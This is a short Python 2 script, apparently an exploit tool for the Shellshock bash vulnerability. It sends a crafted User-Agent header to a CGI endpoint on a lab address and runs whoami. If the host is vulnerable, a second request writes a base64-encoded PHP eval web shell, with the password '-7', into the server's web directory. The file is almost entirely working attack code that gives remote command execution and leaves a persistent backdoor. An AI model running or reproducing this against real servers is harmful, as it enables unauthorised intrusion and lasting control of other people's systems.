#!/usr/bin/env python
#-*- coding:utf-8 -*-
'''
    Test for bash shellshock vul!
'''

import requests

def main(url,shell_file):
    headers = {
        #'User-Agent': 'Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)'
        'User-Agent':'() { :;}; echo a:`/usr/bin/whoami`'
    }
    r = requests.get(url,headers=headers)
    if r.status_code == requests.codes.ok:
        if 'a' in r.headers:
            print 'bash shellshock vul exist!\nexecute whoami:%s' %r.headers['a']
        headers_shell = {
            #'User-Agent': 'Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)'
            'User-Agent':'() { :;}; echo PD9waHAgQGV2YWwoJF9QT1NUWyItNyJdKTsgPz4= | /usr/bin/base64 -d > %s'%shell_file
        }
        r = requests.get(url,headers=headers_shell)
        print 'maybe getshell ok,password is -7,status_code is %s' %r.status_code
    else:
        print 'maybe not vul,status_code:%s' %r.status_code

if __name__ == '__main__':
    url = 'http://172.16.80.144/cgi-bin/test.cgi'
    shell_file = '/var/www/html/test/2.php'

    main(url,shell_file)
